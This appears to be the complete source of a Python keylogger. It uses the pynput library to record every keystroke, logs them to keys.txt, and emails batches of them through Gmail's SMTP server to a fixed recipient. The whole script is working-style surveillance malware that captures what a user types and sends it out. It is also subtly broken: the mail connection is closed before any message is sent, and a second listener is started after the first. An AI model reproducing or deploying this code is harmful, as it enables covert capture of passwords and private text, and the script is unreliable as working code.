
import smtplib, ssl
from pynput import keyboard

port = 587  
smtp_server = "smtp.gmail.com"
sender_email = "sender@gmail.com"
receiver_email = "recipient@gmail.com"
password = input("Type your password and press enter:: ")
context = ssl.create_default_context()
with smtplib.SMTP(smtp_server, port) as server:
    server.ehlo()
    server.starttls(context=context)
    server.ehlo()
    server.login(sender_email, password)

string=""
message_default = """\
Subject: logs


"""

def on_press(key):
    global string
    try:
        string=string+('{0}'.format(key.char))
    except AttributeError:
        string=string+('[ {0} ]'.format(key))

def on_release(key):
    global string
    if len(string)>100 :
        message=message_default+string+"\n"
        server.sendmail(sender_email, receiver_email, message)
        with open("keys.txt","a+") as file :
            file.write(message)
        string=""

with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()

listener = keyboard.Listener(
    on_press=on_press,
    on_release=on_release)
listener.start()
